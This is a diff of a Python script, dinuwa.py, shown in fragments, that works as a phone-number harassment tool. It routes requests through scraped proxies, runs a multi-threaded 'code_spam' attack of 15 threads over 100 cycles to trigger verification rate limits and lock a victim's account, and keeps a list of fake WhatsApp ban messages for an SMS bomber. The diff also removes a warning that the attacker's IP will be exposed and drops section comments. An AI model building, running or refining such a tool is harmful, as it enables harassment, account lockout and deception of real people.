@@ -1,3 +1,4 @@
+cat > dinuwa.py <<'EOF'
 #!/usr/bin/env python3
 import os, sys, time, random, threading, requests
 
@@ -42,7 +43,7 @@ def fetch_and_test_proxies():
             PROXIES = working
             print(f"{G}[+] {len(PROXIES)} working proxies.{RS}")
         else:
-            print(f"{R}[!] No working proxies. Using direct connection (your IP will show).{RS}")
+            print(f"{R}[!] No working proxies. Using direct.{RS}")
             PROXIES = [None]
     except Exception as e:
         print(f"{R}[!] Error: {e}. Using direct.{RS}")
@@ -55,7 +56,6 @@ def get_proxy():
         return None
     return {"http": "http://" + random.choice(PROXIES), "https": "http://" + random.choice(PROXIES)}
 
-# ========== CODE SPAM (WORKS) ==========
 def code_spam(number, cycle):
     proxy = get_proxy()
     headers = {
@@ -88,7 +88,7 @@ def code_spam(number, cycle):
 
 def multi_attack(number):
     fetch_and_test_proxies()
-    print(f"{Y}[+] Attacking {number} with code spam. {'Proxy' if PROXIES[0] else 'Direct'}.{RS}")
+    print(f"{Y}[+] Attacking {number} with code spam.{RS}")
     threads = 15
     cycles = 100
     for c in range(1, cycles+1):
@@ -104,7 +104,6 @@ def multi_attack(number):
         time.sleep(random.uniform(0.5, 1.0))
     print(f"{G}[✔] Attack done. Rate-limit triggered. Ban in 10-30 min.{RS}")
 
-# ========== SMS BOMBER ==========
 BAN_TEXTS = [
     "Your WhatsApp account has been permanently banned.",
     "Account suspended due to spam.",
@@ -268,3 +267,4 @@ def menu():
 
 if __name__ == "__main__":
     menu()
+EOF
